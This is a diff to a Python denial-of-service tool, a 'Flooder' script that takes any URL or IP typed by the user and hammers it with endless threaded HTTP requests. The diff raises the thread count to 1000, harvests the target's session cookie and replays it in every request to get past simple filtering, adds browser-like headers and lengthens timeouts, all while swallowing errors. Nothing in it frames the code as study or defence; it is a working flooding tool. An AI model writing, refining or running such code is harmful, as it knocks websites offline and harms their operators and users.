@@ -10,24 +10,21 @@ import time
 import random
 import sys
 
-# Global variables
-thread_limit = 500  # Number of threads
+# Global parameters
+thread_limit = 1000  # Number of threads
 user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
-# Global variables end
+# Global parameters end
 
 
 class Flooder(threading.Thread):
-    str_target = None
-    global target, user_agent
+    global user_agent
 
     def __init__(self):
         threading.Thread.__init__(self)
-        self.str_target = target.scheme+"://"+target.netloc+target.path
 
     def run(self):
         try:
             while True:
-                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(100))
                 q1 = str(round(random.uniform(0.5, 0.7), 1))
                 q2 = str(round(random.uniform(0.7, 1), 1))
                 cur_header = {
@@ -37,10 +34,12 @@ class Flooder(threading.Thread):
                     "Connection": "Keep-Alive",
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache",
-                    "User-agent": user_agent
+                    "User-agent": user_agent,
+                    "Cookie": cookie,
+                    "Accept-Encoding": "gzip;q=1.0, identity; q=0.5, *;q=0"
                 }
-                req = urllib.request.Request(self.str_target, data=str.encode(randstr), headers=cur_header)
-                urllib.request.urlopen(req)
+                req = urllib.request.Request(str_target, headers=cur_header)
+                urllib.request.urlopen(req, timeout=60000)
         except:
             pass
 
@@ -72,14 +71,22 @@ else:
     print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
     target = input()
 
-target = urllib.parse.urlparse(target + '/')
-
+target = urllib.parse.urlparse(target)
 if target.netloc.__len__() == 0:
     print("Incorrect url input")
     exit()
-#  preparations ended / threads starting
+str_target = target.scheme+"://"+target.netloc+target.path+target.params
+if target.path.__len__() ==0:
+    str_target = str_target + "/"
+#  preparations ended
 
-print("Flooding %s" % target.netloc)
+#  getting cookies
+req = urllib.request.Request(str_target)
+resp = urllib.request.urlopen(req)
+cookie = resp.headers['Set-Cookie']
+#  end cookies getting
+
+print("Flooding %s" % str_target)
 Checker().start()
 while True:
     if threading.active_count() <= thread_limit:
